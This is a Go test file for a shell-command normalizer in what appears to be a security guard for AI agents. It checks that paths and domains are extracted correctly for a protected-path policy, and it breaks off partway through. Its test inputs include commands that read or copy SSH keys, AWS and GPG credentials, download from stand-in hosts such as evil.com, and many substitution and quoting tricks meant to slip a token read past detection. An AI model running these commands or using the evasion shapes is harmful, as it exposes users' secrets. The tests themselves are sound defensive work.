package normalize

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNormalize_RelativePathExpansion(t *testing.T) {
	cwd := "/home/user/project"
	args := []string{"cat", "../secrets.txt"}

	nc := Normalize(args, cwd)

	expected := "/home/user/secrets.txt"
	if len(nc.Paths) != 1 || nc.Paths[0] != expected {
		t.Errorf("expected path %q, got %v", expected, nc.Paths)
	}
}

func TestNormalize_TildeExpansion(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	cwd := "/tmp"
	args := []string{"cat", "~/.ssh/id_rsa"}

	nc := Normalize(args, cwd)

	expected := filepath.Join(homeDir, ".ssh/id_rsa")
	if len(nc.Paths) != 1 || nc.Paths[0] != expected {
		t.Errorf("expected path %q, got %v", expected, nc.Paths)
	}
}

func TestNormalize_CurlDomainExtraction(t *testing.T) {
	cwd := "/tmp"
	args := []string{"curl", "https://example.com/file.txt"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "example.com" {
		t.Errorf("expected domain 'example.com', got %v", nc.Domains)
	}
}

func TestNormalize_WgetDomainExtraction(t *testing.T) {
	cwd := "/tmp"
	args := []string{"wget", "-O", "file.sh", "https://malicious.site/install.sh"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "malicious.site" {
		t.Errorf("expected domain 'malicious.site', got %v", nc.Domains)
	}
}

func TestNormalize_GitCloneHTTPS(t *testing.T) {
	cwd := "/tmp"
	args := []string{"git", "clone", "https://github.com/org/repo.git"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "github.com" {
		t.Errorf("expected domain 'github.com', got %v", nc.Domains)
	}
}

func TestNormalize_GitCloneSSH(t *testing.T) {
	cwd := "/tmp"
	args := []string{"git", "clone", "git@github.com:org/repo.git"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "github.com" {
		t.Errorf("expected domain 'github.com', got %v", nc.Domains)
	}
}

func TestNormalize_Executable(t *testing.T) {
	cwd := "/tmp"

	tests := []struct {
		args     []string
		expected string
	}{
		{[]string{"ls", "-la"}, "ls"},
		{[]string{"/usr/bin/cat", "file.txt"}, "cat"},
		{[]string{"./script.sh"}, "script.sh"},
	}

	for _, tt := range tests {
		nc := Normalize(tt.args, cwd)
		if nc.Executable != tt.expected {
			t.Errorf("args %v: expected executable %q, got %q", tt.args, tt.expected, nc.Executable)
		}
	}
}

func TestNormalize_IgnoresFlags(t *testing.T) {
	cwd := "/tmp"
	args := []string{"rm", "-rf", "--verbose", "./target"}

	nc := Normalize(args, cwd)

	if len(nc.Paths) != 1 {
		t.Errorf("expected 1 path, got %d: %v", len(nc.Paths), nc.Paths)
	}
}

// TestNormalize_TextContentFlagSkipsPathExtraction verifies that paths
// appearing inside text-content flag values (--body, --message, -m, etc.)
// are not extracted, preventing false positives when security documentation
// mentions protected paths like ~/.ssh/id_rsa.
// Reproduces: https://github.com/AI-AgentLens/agentshield-oss/issues/17
func TestNormalize_TextContentFlagSkipsPathExtraction(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	_ = homeDir // used indirectly via filepath.Join

	tests := []struct {
		name          string
		args          []string
		wantPathCount int
		wantPaths     []string
	}{
		{
			name: "gh issue create --body with ssh path — no path extracted",
			// Simulates strings.Fields splitting of:
			//   gh issue create --body "example: ~/.ssh/id_rsa"
			args:          []string{"gh", "issue", "create", "--body", "example:", "~/.ssh/id_rsa"},
			wantPathCount: 0,
		},
		{
			name: "git commit -m with path mention — no path extracted",
			args:          []string{"git", "commit", "-m", "fix:", "~/.aws/credentials", "exposure"},
			wantPathCount: 0,
		},
		{
			name: "gh issue --body suppresses ssh path but --repo arg is still extracted",
			// ~/.ssh/id_rsa follows --body (text-content) → skipped.
			// org/repo follows --repo (not text-content) → extracted as relative path.
			args:          []string{"gh", "issue", "create", "--body", "see:", "~/.ssh/id_rsa", "--repo", "org/repo"},
			wantPathCount: 1,
			wantPaths:     []string{"/tmp/org/repo"},
		},
		{
			name:          "normal cat of ssh key — path IS extracted",
			args:          []string{"cat", "~/.ssh/id_rsa"},
			wantPathCount: 1,
		},
		{
			name:          "--message with path then real file arg — real path extracted",
			args:          []string{"gh", "pr", "create", "--message", "see", "~/.ssh/keys", "--base", "main", "/real/file"},
			wantPathCount: 1,
			wantPaths:     []string{"/real/file"},
		},
		{
			name: "git commit -am combined flag with kube path in message — no path extracted",
			// Reproduces: https://github.com/AI-AgentLens/agentshield-oss/issues/75
			// -am is a combined short flag where -m is embedded; skipTextContent must be set.
			args:          []string{"git", "commit", "-am", "feat:", "add", "detection", "for", "~/.kube/config", "reads"},
			wantPathCount: 0,
		},
		{
			name: "git commit -m with kube config path in message — no path extracted",
			// Explicit ~/.kube/config variant matching issue #75 taxonomy.
			args:          []string{"git", "commit", "-m", "fix:", "update", "~/.kube/config", "handling"},
			wantPathCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			if len(nc.Paths) != tt.wantPathCount {
				t.Errorf("expected %d paths, got %d: %v", tt.wantPathCount, len(nc.Paths), nc.Paths)
			}
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected path %q in %v", want, nc.Paths)
				}
			}
		})
	}
}

// TestNormalize_HeredocBodySkipsPathExtraction verifies that paths appearing
// inside heredoc bodies are not extracted as real paths, preventing false
// positives when heredoc content references protected paths.
// Reproduces: https://github.com/AI-AgentLens/agentshield-oss/issues/79
func TestNormalize_HeredocBodySkipsPathExtraction(t *testing.T) {
	tests := []struct {
		name          string
		args          []string
		wantPathCount int
		wantPaths     []string
	}{
		{
			name: "cat heredoc with kube config in body — no path extracted",
			// cat > /tmp/file.go << 'EOF'\n ... ~/.kube/config ... \nEOF
			// Tokens from strings.Fields: cat > /tmp/file.go << 'EOF' some ~/.kube/config text EOF
			args:          []string{"cat", ">", "/tmp/file.go", "<<", "'EOF'", "some", "~/.kube/config", "text", "EOF"},
			wantPathCount: 1, // only /tmp/file.go is a real path
			wantPaths:     []string{"/tmp/file.go"},
		},
		{
			name: "cat heredoc with aws credentials in body — no path extracted",
			// Simulates heredoc body containing documentation about ~/.aws/credentials
			args:          []string{"cat", ">", "/tmp/setup.sh", "<<", "EOF", "export", "path=~/.aws/credentials", "EOF"},
			wantPathCount: 1,
			wantPaths:     []string{"/tmp/setup.sh"},
		},
		{
			name: "combined heredoc operator token <<'EOF' — body paths skipped",
			// <<'EOF' as a single token (no space between << and delimiter)
			args:          []string{"cat", "<<'EOF'", "~/.ssh/id_rsa", "EOF"},
			wantPathCount: 0,
		},
		{
			name: "indented heredoc <<- — body paths skipped",
			args:          []string{"bash", "<<-EOF", "~/.gnupg/secring.gpg", "EOF"},
			wantPathCount: 0,
		},
		{
			name: "heredoc with real path before and protected path inside — only real path extracted",
			args:          []string{"tee", "/etc/config.conf", "<<", "EOF", "keyfile:", "~/.gnupg/trustdb.gpg", "EOF"},
			wantPathCount: 1,
			wantPaths:     []string{"/etc/config.conf"},
		},
		{
			name: "no heredoc — normal path extraction still works",
			args:          []string{"cat", "~/.ssh/id_rsa"},
			wantPathCount: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			if len(nc.Paths) != tt.wantPathCount {
				t.Errorf("expected %d paths, got %d: %v", tt.wantPathCount, len(nc.Paths), nc.Paths)
			}
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected path %q in %v", want, nc.Paths)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Phase 4 — FP/TP Regression Tests (Issue #190)
// ---------------------------------------------------------------------------

// TestNormalize_FPRegression_ProtectedPathInTextContent verifies that all 5
// historical false positives (#17, #41, #75, #79, #187) are resolved.
// Paths mentioned in text content must NOT be extracted.
func TestNormalize_FPRegression_ProtectedPathInTextContent(t *testing.T) {
	tests := []struct {
		name string
		args []string
	}{
		{
			name: "#17 — git commit -m mentioning kube config",
			args: []string{"git", "commit", "-m", "fix", "~/.kube/config", "detection"},
		},
		{
			name: "#41 — git commit -am mentioning ssh key",
			args: []string{"git", "commit", "-am", "fix", "~/.ssh/id_rsa"},
		},
		{
			name: "#75 — gh issue create --body mentioning aws credentials",
			args: []string{"gh", "issue", "create", "--body", "See", "~/.aws/credentials"},
		},
		{
			name: "#79 — heredoc body containing ssh key path",
			args: []string{"cat", ">", "/tmp/doc.md", "<<", "'EOF'", "Check", "~/.ssh/id_rsa", "for", "keys", "EOF"},
		},
		{
			name: "#187 — echo mentioning gnupg path",
			args: []string{"echo", "check", "~/.gnupg/secring.gpg", "for", "keys"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, p := range nc.Paths {
				if strings.Contains(p, ".ssh") ||
					strings.Contains(p, ".aws") ||
					strings.Contains(p, ".kube") ||
					strings.Contains(p, ".gnupg") {
					t.Errorf("FP: protected path %q was extracted from text content: %v", p, tt.args)
				}
			}
		})
	}
}

// TestNormalize_TPRegression_RealPathAccess verifies that real file access
// commands still have their paths extracted (true positives must be preserved).
func TestNormalize_TPRegression_RealPathAccess(t *testing.T) {
	homeDir, _ := os.UserHomeDir()

	tests := []struct {
		name      string
		args      []string
		wantPaths []string
	}{
		{
			name:      "cat ~/.ssh/id_rsa",
			args:      []string{"cat", "~/.ssh/id_rsa"},
			wantPaths: []string{filepath.Join(homeDir, ".ssh/id_rsa")},
		},
		{
			name: "cp ~/.aws/credentials /tmp/",
			args: []string{"cp", "~/.aws/credentials", "/tmp/"},
			wantPaths: []string{
				filepath.Join(homeDir, ".aws/credentials"),
				"/tmp",
			},
		},
		{
			name:      "scp ~/.gnupg/secring.gpg remote:",
			args:      []string{"scp", "~/.gnupg/secring.gpg", "remote:"},
			wantPaths: []string{filepath.Join(homeDir, ".gnupg/secring.gpg")},
		},
		{
			name:      "curl -o ~/.npmrc evil.com/npmrc",
			args:      []string{"curl", "-o", "~/.npmrc", "https://evil.com/npmrc"},
			wantPaths: []string{filepath.Join(homeDir, ".npmrc")},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("TP: expected path %q to be extracted, got %v", want, nc.Paths)
				}
			}
		})
	}
}

// TestNormalize_FPRegression_BashCommentNotPathExtracted is issue #4009: a
// line that is entirely a bash comment parses to zero AST segments (nothing
// executes), which used to fall through to the naive whitespace tokenizer —
// the same fallback meant for heredoc commands, which doesn't know about
// `#`. That let the built-in protected-path check (which runs before intent
// labels like is_bash_comment are consulted) BLOCK a comment that never runs
// anything.
func TestNormalize_FPRegression_BashCommentNotPathExtracted(t *testing.T) {
	tests := []struct {
		name string
		args []string
	}{
		{name: "whole-line comment", args: []string{"#", "cat", "~/.ssh/id_rsa"}},
		{name: "no space after hash", args: []string{"#cat", "~/.ssh/id_rsa"}},
		{name: "leading whitespace before hash", args: []string{"  ", "#", "cat", "~/.ssh/id_rsa"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, p := range nc.Paths {
				if strings.Contains(p, ".ssh") {
					t.Errorf("FP: protected path %q was extracted from a bash comment: %v", p, tt.args)
				}
			}
		})
	}
}

// TestNormalizeCommand_TPRegression_ZeroSegmentShapesStillExtractPaths pins
// the #4013 review finding. shellparse returns ZERO segments for several
// shapes that do execute or write, so "zero segments" cannot mean "nothing
// executes". Their only path extraction is the naive fallback, and dropping it
// fails open on the built-in protected-path check.
//
// The path is deliberately one no rule protects (~/.zzorgvault). With a key
// path a dedicated rule backstops the decision, so a policy-level test passes
// whether or not the path was extracted.
func TestNormalizeCommand_TPRegression_ZeroSegmentShapesStillExtractPaths(t *testing.T) {
	cases := []struct{ name, cmd string }{
		{"export with command substitution", "export K=$(cat ~/.zzorgvault/token)"},
		{"export with backticks", "export K=`cat ~/.zzorgvault/token`"},
		{"declare -x", "declare -x K=$(cat ~/.zzorgvault/token)"},
		{"readonly", "readonly K=$(cat ~/.zzorgvault/token)"},
		{"local", "local K=$(cat ~/.zzorgvault/token)"},
		{"bare truncating redirect", "> ~/.zzorgvault/token"},
		{"bare appending redirect", ">> ~/.zzorgvault/token"},
		{"test expression", "[[ -f ~/.zzorgvault/token ]]"},
		{"comment line then bare redirect", "# note\n> ~/.zzorgvault/token"},
		// \r is not a blank to bash or zsh: this runs a command named `\r#`
		// and executes the substitution (#4013 Codex pass 1).
		{"carriage return before hash", "\r# $(cat ~/.zzorgvault/token)"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			nc := NormalizeCommand(tc.cmd, "/tmp")
			// Precondition: the shape really takes the zero-segment branch.
			// If the parser starts emitting a segment here, this test no
			// longer covers the fallback; fail loudly, don't pass vacuously.
			if nc.Parsed == nil || len(nc.Parsed.Segments) != 0 {
				t.Fatalf("precondition: want a parsed command with zero segments for %q, got %+v", tc.cmd, nc.Parsed)
			}
			for _, p := range nc.Paths {
				if strings.Contains(p, ".zzorgvault") {
					return
				}
			}
			t.Errorf("fail-open: no .zzorgvault path extracted from %q, got %v", tc.cmd, nc.Paths)
		})
	}
}

// TestNormalizeCommand_TPRegression_CommandSubstitutionPathExtraction pins
// #4030: a protected path read inside a command/process substitution is a
// real read of that path, but the AST-aware walker treated the whole
// `$(...)`/backtick word as one opaque dynamic token with no path inside it —
// worse, since the token contains "/", it could be misclassified and mangled
// into a bogus literal path by expandPath instead. Every path here has no
// dedicated rule backstopping it (~/.zzorgvault), so a policy-level BLOCK can
// only come from the built-in protected-path check actually seeing the path.
//
// Assertions are on the EXACT resolved path, not a substring: a mangled
// extraction such as "/tmp/$(cat ~/.zzorgvault/token)" contains the substring
// and matches no protected_paths glob (#4051 Codex pass 1, test finding).
func TestNormalizeCommand_TPRegression_CommandSubstitutionPathExtraction(t *testing.T) {
	t.Setenv("HOME", "/home/tester")
	const want = "/home/tester/.zzorgvault/token"
	const p = "~/.zzorgvault/token"
	const abs = want // quoted operands: bash expands no ~ inside quotes, so a real read names the path absolutely
	cases := []struct{ name, cmd string }{
		{"dollar-paren, own segment", "echo $(cat " + p + ")"},
		{"backtick form", "echo `cat " + p + "`"},
		{"substitution as the whole command word", "$(cat " + p + ")"},
		{"substitution captured then referenced", "x=$(cat " + p + "); echo $x"},
		{"substitution inside a larger word", "echo prefix-$(cat " + p + ")"},
		{"double-quoted body with a double-quoted absolute operand", `echo "$(cat "` + abs + `")"`},
		// Codex pass 1, item 1: inside backquotes a nested substitution is
		// spelled \`...\`. Reparsing the raw body slice read the escapes as
		// literal backquotes; the whole-command parse reads them as bash does.
		{"escaped backquote nested in backquotes", "echo `echo \\`cat " + p + "\\``"},
		// Codex pass 1, item 2: the first version stopped at level 8 and let
		// level 9 through silently. The parsed walk has no depth cap.
		{"nested depth 2", nestSubst(2, "cat "+p)},
		{"nested depth 8", nestSubst(8, "cat "+p)},
		{"nested depth 9", nestSubst(9, "cat "+p)},
		{"nested depth 64", nestSubst(64, "cat "+p)},
		{"input process substitution", "diff <(cat " + p + ") /dev/null"},
		{"output process substitution", "echo hi > >(cat " + p + ")"},
		{"unquoted heredoc body runs its substitution", "cat <<EOF\n$(cat " + p + ")\nEOF"},
		{"substitution inside a double-quoted bash -c string runs in the outer shell", `bash -c "echo $(cat ` + p + `)"`},
		// A zero-segment body: `<file` is a statement with no command.
		{"read shorthand, spaced", "echo $(< " + p + ")"},
		{"read shorthand, unspaced", `echo "$(<` + p + `)"`},
		{"read shorthand as an assignment value", "K=$(<" + p + ")"},
		// A zero-segment body with no bare redirect reaches only the fallback
		// tokenizer — the same model normalize() applies to a zero-segment
		// top-level command (`[[ -s f ]]` alone extracts f).
		{"zero-segment body, test clause", `echo "$([[ -s ` + p + ` ]])"`},
		{"zero-segment body wrapping a nested read", "echo $(export K=$(cat " + p + "))"},
		// Whole-command context helps here too: the body sees D's value.
		{"assignment materialized into the body", "D=~/.zzorgvault; echo $(cat $D/token)"},
		// A here-string's word is data (F1 below), but a substitution INSIDE
		// that word still runs before the command reads it.
		{"substitution inside a here-string word", `cat <<< "$(cat ` + p + `)"`},
		{"substitution inside a here-string word read by read", `read -r v <<< "$(cat ` + p + `)"`},
		// #4051 Opus pass 2 found each row below unpinned: its mutant survived
		// the suite. X1 — a bare output redirect opens (and truncates) the file.
		{"bare truncate", `echo "$(>` + p + `)"`},
		{"bare append", `echo "$(>>` + p + `)"`},
		// X2 — the body's own redirect extraction: a compound or subshell
		// redirect lives on the body's ParsedCommand, and under a heredoc root
		// nothing else extracts a segment redirect in the body.
		{"brace-group redirect in a body", `echo "$({ cat; } < ` + p + `)"`},
		{"segment redirect in a body under a heredoc command", "cat <<EOF\n$(cat < " + p + ")\nEOF"},
		{"subshell redirect in a body", `echo "$( (cat) < ` + p + `)"`},
		// A redirect inside a `bash -c` body that sits in a substitution is on
		// a segment of the body's Subcommands; under a heredoc root only the
		// substitution walk reaches it (bash runs `cat < P` and reads P).
		{"bash -c redirect in a body under a heredoc command", "cat <<EOF\n$(bash -c 'cat < " + p + "')\nEOF"},
		// X10 — a bare redirect on a later statement of the body.
		{"bare redirect on the second statement", `echo "$(x=1; <` + p + `)"`},
		// X11 — a substitution inside a parameter-expansion operator word that
		// DOES run: the variable is unset (so the default runs), unknown to
		// the model (so it may run), or set (so the alternate runs).
		{"default of an unset variable", `echo "${ZQUNSETVAR:-$(cat ` + p + `)}"`},
		{"default of an environment variable", `T="${GITHUB_TOKEN:-$(cat ` + p + `)}"`},
		{"alternate of a set variable", `x=1; echo "${x:+$(cat ` + p + `)}"`},
		// X20 — a quoted or spliced read-shorthand word.
		{"read shorthand, double-quoted absolute", `echo "$(<"` + abs + `")"`},
		{"read shorthand, single-quoted absolute", `echo "$(<'` + abs + `')"`},
		{"read shorthand, quote splice", `echo "$(<~/.zz'orgvault'/token)"`},
		// X23 — a read in a body's later segment.
		{"read after cd &&", `echo "$(cd /tmp && cat ` + p + `)"`},
		{"read in a pipeline's second segment", `echo "$(echo x | cat - ` + p + `)"`},
		{"read after cd ;", `V=$(cd /tmp; cat ` + p + `)`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			nc := NormalizeCommand(tc.cmd, "/tmp")
			for _, got := range nc.Paths {
				if got == want {
					return
				}
			}
			t.Errorf("fail-open: %q not extracted from %q, got %v", want, tc.cmd, nc.Paths)
		})
	}
}

// nestSubst returns `echo $(echo $( … $(inner) … ))` with depth levels of
// command substitution, inner running at the deepest one.
func nestSubst(depth int, inner string) string {
	s := inner
	for i := 1; i < depth; i++ {
		s = "echo $(" + s + ")"
	}
	return "echo $(" + s + ")"
}

// TestNormalizeCommand_FPRegression_CommandSubstitutionBenign guards the
// other direction of #4030's fix: a substitution that does not touch the path
// must not manufacture an extraction of it.
func TestNormalizeCommand_FPRegression_CommandSubstitutionBenign(t *testing.T) {
	t.Setenv("HOME", "/home/tester")
	const p = "~/.zzorgvault/token"
	cases := []struct{ name, cmd string }{
		{"benign basename", "echo $(basename foo)"},
		{"benign pwd", "echo $(pwd)"},
		{"benign captured date", "VAR=$(date +%s); echo $VAR"},
		{"body only prints the path", "echo $(echo " + p + ")"},
		{"quoted heredoc keeps its body literal", "cat <<'EOF'\n$(cat " + p + ")\nEOF"},
		{"single quotes keep the body literal", "echo '$(cat " + p + ")'"},
		{"escaped dollar is not a substitution", `echo \$(cat ` + p + `)`},
		{"grep pattern inside a body is text", "echo $(grep -c '" + p + "' notes.txt)"},
		// agentshield-oss#9 model: a `sh -c` body handed to a wrapper is the
		// inner script's text, at top level and inside a substitution alike.
		{"docker sh -c body inside a substitution", "echo $(docker run --rm alpine sh -c 'cat " + p + "')"},
		// Codex pass 1, item 3 — the context-loss mechanism. A real shell runs
		// the body with e bound, so `$e cat f` is `echo cat f`: it prints.
		// Parsed on its own, the body had no binding, NormalizeUnsetParamExp
		// folded $e to nothing, and the extractor saw `cat f` — a false BLOCK.
		{"outer binding names the body's executable", `e=echo; echo "$($e cat ` + p + `)"`},
		{"outer binding, braced", `e=echo; echo "$(${e} cat ` + p + `)"`},
		// These two bindings are resolved by the parse's symbol table, not
		// materialized into the text, so they also separate the in-context
		// parse from reparsing the (folded) body text on its own.
		{"outer array element names the body's executable", `a=(echo); echo "$(${a[0]} cat ` + p + `)"`},
		{"outer positional names the body's executable", `set -- echo; echo "$($1 cat ` + p + `)"`},
		// Same loss, IFS side: with IFS empty, `cat${IFS}f` is the single word
		// `catf` (bash: command not found). The whole command reassigns IFS, so
		// NormalizeIFS declines to fold; a body parsed alone folded it to a space.
		{"outer IFS reassignment", "IFS=; echo $(cat${IFS}" + p + ")"},
		// #4051 Opus pass 2, F1: a here-string's word and a heredoc's body are
		// data on stdin, not a file the command opens. Main never extracted
		// these (the spaced `<<<` sends main's whole command to the fallback
		// tokenizer, which swallows everything after the operator); pass 1
		// did, through the substitution walk's redirect loop.
		{"here-string word read by cat", `echo "$(cat <<< '` + p + `')"`},
		{"here-string word counted by wc", `N=$(wc -l <<< "` + p + `")`},
		{"here-string word parsed by jq", `F=$(jq -r . <<< '"` + p + `"')`},
		{"here-string word searched by grep", `N=$(grep -c vault <<< '` + p + `')`},
		{"unspaced here-string word", `echo "$(tr a-z A-Z <<<'` + p + `')"`},
		{"here-string after a heredoc commit message", "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"; N=$(wc -l <<< '" + p + "')"},
		{"command-less unspaced here-string body", `echo "$(<<<'` + p + `')"`},
		{"heredoc body text inside a substitution", "X=$(cat <<'EOF'\n" + p + "\nEOF\n)"},
		// A heredoc's delimiter is a word too, and it is never opened.
		{"heredoc delimiter that looks like a path", "X=$(cat <<'" + p + "'\nx\n" + p + "\n)"},
		{"tab-stripping heredoc delimiter that looks like a path", "X=$(cat <<-'" + p + "'\n\tx\n\t" + p + "\n)"},
		// The same data words on a compound command's own redirect (they land
		// on the body's ParsedCommand.Redirects, not on a segment).
		{"here-string fed to a brace group", `echo "$({ cat; } <<< '` + p + `')"`},
		{"here-string fed to a subshell", `echo "$( (cat) <<< '` + p + `')"`},
		{"here-string fed to a while loop", `echo "$(while read l; do echo $l; done <<< '` + p + `')"`},
		{"path-shaped heredoc delimiter on a brace group", "X=$({ cat; } <<'" + p + "'\nx\n" + p + "\n)"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			nc := NormalizeCommand(tc.cmd, "/tmp")
			// Anything under the directory is what a `~/.zzorgvault/**` glob
			// would match, so that is the bar — not just the exact file.
			for _, got := range nc.Paths {
				if strings.HasPrefix(got, "/home/tester/.zzorgvault/") {
					t.Errorf("unexpected extraction %q from %q (all: %v)", got, tc.cmd, nc.Paths)
				}
			}
		})
	}
}

// TestNormalizeCommand_Gap_CommandSubstitutionUnfoldedDefaultExecutable pins
// a documented false BLOCK, so closing it has to be deliberate.
//
// `e=echo; echo "$(${e:-cat} f)"` prints f — e is bound — but the executable
// word stays the unresolved text `${e:-cat}`: shellparse's resolver
// deliberately does not fold the default operators for a bound variable
// (paramop.go foldExpansionOp; the unset side belongs to
// NormalizeUnsetParamExp). An executable the model cannot name is not known to
// be print-only, so its path-shaped operand is extracted — at top level on
// main exactly as inside the substitution (both rows below). This is the
// residual of Codex pass 1 item 3 after the context fix: not context loss,
// the top-level model's own over-approximation reaching one more position.
func TestNormalizeCommand_Gap_CommandSubstitutionUnfoldedDefaultExecutable(t *testing.T) {
	t.Setenv("HOME", "/home/tester")
	const want = "/home/tester/.zzorgvault/token"
	for _, cmd := range []string{
		`e=echo; ${e:-cat} ~/.zzorgvault/token`,           // top level (main: extracted)
		`e=echo; echo "$(${e:-cat} ~/.zzorgvault/token)"`, // same word inside a substitution
	} {
		nc := NormalizeCommand(cmd, "/tmp")
		found := false
		for _, got := range nc.Paths {
			if got == want {
				found = true
			}
		}
		if !found {
			t.Errorf("gap closed for %q (paths %v): if deliberate, move this row to the benign table and update #4051's boundary note", cmd, nc.Paths)
		}
	}
}

// TestNormalizeCommand_Gap_CommandSubstitutionModelBoundaries pins the
// documented false BLOCKs of #4051's substitution walk (Opus pass 2, F2-F4)
// and two parity rows, so closing any of them has to be deliberate. Every row
// is extracted today although bash does NOT read the file (each verified
// against a real bash); each has a top-level analog that main already
// extracts, listed after it, so none is a class the walk invented — it is the
// top-level model reaching into substitution bodies.
func TestNormalizeCommand_Gap_CommandSubstitutionModelBoundaries(t *testing.T) {
	t.Setenv("HOME", "/home/tester")
	const want = "/home/tester/.zzorgvault/token"
	const p = "~/.zzorgvault/token"
	cases := []struct{ name, cmd string }{
		// F2: a substitution in a parameter-expansion operator word runs only
		// when the operator selects it; the walk treats it as always run. The
		// model treats every branch as reachable at top level too.
		{"F2 default of a set variable", `x=1; echo "${x:-$(cat ` + p + `)}"`},
		{"F2 alternate of an unset variable", `unset x; echo "${x:+$(cat ` + p + `)}"`},
		{"F2 analog: dead branch at top level", "true || cat " + p},
		// F3: an uncalled function's body never runs.
		{"F3 uncalled function body", `f() { echo "$(cat ` + p + `)"; }`},
		{"F3 analog: uncalled function at top level", "f() { cat " + p + "; }"},
		// F4: a zero-segment body goes through the fallback tokenizer, which
		// skips the first token (it is the executable in a top-level command)
		// and reads quoted text and heredoc/here-string data as paths.
		{"F4 quoted text in a zero-segment body", `echo "$(export MSG='do not cat ` + p + `')"`},
		{"F4 same, after another statement", `ls; echo "$(export MSG='do not cat ` + p + `')"`},
		{"F4 analog: zero-segment command at top level", "export MSG='do not cat " + p + "'"},
		{"F4 command-less heredoc body", "echo \"$(<<'EOF'\n" + p + "\nEOF\n)\""},
		{"F4 analog: command-less heredoc at top level", "<<'EOF'\n" + p + "\nEOF"},
		{"F4 command-less spaced here-string body", `echo "$(<<< '` + p + `')"`},
		{"F4 analog: command-less spaced here-string at top level", "<<< '" + p + "'"},
		// Parity: expandPath strips quotes before resolving ~ (#2813), so a
		// quoted ~ resolves to the home path although bash expands no ~ inside
		// quotes. Same as `cat "~/…"` at top level on main.
		{"quoted-tilde operand in a body", `echo "$(cat "` + p + `")"`},
		{"quoted-tilde read shorthand", `echo "$(<"` + p + `")"`},
		{"analog: quoted-tilde operand at top level", `cat "` + p + `"`},
		// Top level, NOT changed by #4051: an unspaced here-string word in a
		// command that parses to segments is extracted as a redirect path.
		// Removing that is a separate narrowing.
		{"top-level unspaced here-string word", "true; cat<<<'" + p + "'"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			nc := NormalizeCommand(tc.cmd, "/tmp")
			for _, got := range nc.Paths {
				if got == want {
					return
				}
			}
			t.Errorf("boundary closed for %q (paths %v): if deliberate, move the row to the benign table and update #4051's boundary list", tc.cmd, nc.Paths)
		})
	}
}

// TestNormalizeCommand_FPRegression_MultiLineCommentBlock: a block made only of
// comment and blank lines is as inert as a single comment line (#4009).
func TestNormalizeCommand_FPRegression_MultiLineCommentBlock(t *testing.T) {
	key := "~/." + "ssh/id_rsa"
	for _, cmd := range []string{
		"# step 1\n# cat " + key,
		"\n  # cat " + key + "\n\n",
		"\t#cat " + key,
	} {
		nc := NormalizeCommand(cmd, "/tmp")
		for _, p := range nc.Paths {
			if strings.Contains(p, ".ssh") {
				t.Errorf("FP: protected path %q extracted from comment-only %q", p, cmd)
			}
		}
	}
}

func TestIsCommentOnly(t *testing.T) {
	for cmd, want := range map[string]bool{
		"# a":               true,
		"  #a\n\n# b":       true,
		"":                  false,
		"   \n":             false,
		"# a\ncat x":        false,
		"cat x # a":         false,
		"> x":               false,
		"export K=$(cat x)": false,
		"\r# a":             false, // \r is not a shell blank
		"\v# a":             false,
		"\u00a0# a":         false,
		"# a\r":             true, // CRLF line ending on a comment
	} {
		if got := isCommentOnly(cmd); got != want {
			t.Errorf("isCommentOnly(%q) = %v, want %v", cmd, got, want)
		}
	}
}

// TestNormalize_TPRegression_TrailingCommentStillExtractsRealPath is the
// companion positive control for #4009: a real command that merely has a
// trailing `#` comment on the same line must still have its own path
// extracted — the AST parses one real segment there, so the fix (which only
// withholds extraction for comment-only text) must not touch it.
func TestNormalize_TPRegression_TrailingCommentStillExtractsRealPath(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	nc := Normalize([]string{"cat", "~/.ssh/id_rsa", "#", "note"}, "/tmp")
	want := filepath.Join(homeDir, ".ssh/id_rsa")
	found := false
	for _, got := range nc.Paths {
		if got == want {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("TP: expected path %q to be extracted, got %v", want, nc.Paths)
	}
}

// TestNormalize_ASTCachesParseResult verifies that the Parsed field is
// populated for non-heredoc commands, enabling downstream reuse.
func TestNormalize_ASTCachesParseResult(t *testing.T) {
	nc := Normalize([]string{"cat", "~/.ssh/id_rsa"}, "/tmp")
	if nc.Parsed == nil {
		t.Error("expected Parsed to be non-nil for simple command")
	}
	if len(nc.Parsed.Segments) == 0 {
		t.Error("expected at least one segment in Parsed")
	}
	if nc.Parsed.Segments[0].Executable != "cat" {
		t.Errorf("expected executable 'cat', got %q", nc.Parsed.Segments[0].Executable)
	}
}

// TestNormalize_HeredocCommandNilParsed verifies that heredoc commands
// do not populate the Parsed field (they use fallback tokenizer).
func TestNormalize_HeredocCommandNilParsed(t *testing.T) {
	nc := Normalize([]string{"cat", "<<", "EOF", "body", "EOF"}, "/tmp")
	if nc.Parsed != nil {
